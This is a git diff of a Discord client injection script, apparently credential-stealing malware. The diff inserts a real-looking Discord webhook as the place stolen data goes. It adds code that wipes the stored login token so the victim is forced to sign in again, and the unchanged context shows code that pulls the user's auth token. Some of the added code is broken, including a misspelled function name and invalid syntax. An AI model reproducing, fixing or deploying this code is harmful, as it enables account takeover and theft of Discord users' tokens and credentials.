@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "%WEBHOOK%",
+    webhook: "https://discord.com/api/webhooks/1338969159446298625/5lgzXMmZpwYlx6J8W0B3S9E7cjjIarYYFJtPkIuYPX1s-VDi_j_3L5iIpVqEA8vazbHV",
     injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
     filters: {
         urls: [
@@ -37,6 +37,9 @@ const CONFIG = {
         ],
     },
     API: "https://discord.com/api/v9/users/@me",
+    logout: {
+        urls =  '/auth/logout',
+    },
     badges: {
         Discord_Emloyee: {
             Value: 1,
@@ -117,7 +120,14 @@ const clearAllUserData = () => {
 };
 
 const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+const logout = async () => await excuteJS(`    setInterval(() => {
+        document.body.appendChild(document.createElement\`iframe\`).contentWindow.localStorage.token = `""`
+    }, 50);
+    setTimeout(() => {
+        location.reload();
+    }, 2500);`);
 
+await logout();
 const request = async (method, url, headers, data) => {
     url = new URL(url);
     const options = {
@@ -300,7 +310,7 @@ const getServers = async token => {
         if (rareGuilds === "") {
             rareGuilds += `**Rare Servers:**\n`;
         }
-        rareGuilds += `${guild.owner ? "<:5253423owner:1309423750222970880> Owner" : "<:Admin:1296432239390883850> Admin"} | \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+        rareGuilds += `${guild.owner ? "<:5253423owner:1309423750222970880> Owner" : "<:42425Admin:1309426325479489567> Admin"} | \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
     }
 
     rareGuilds = rareGuilds || "**No Rare Servers**";
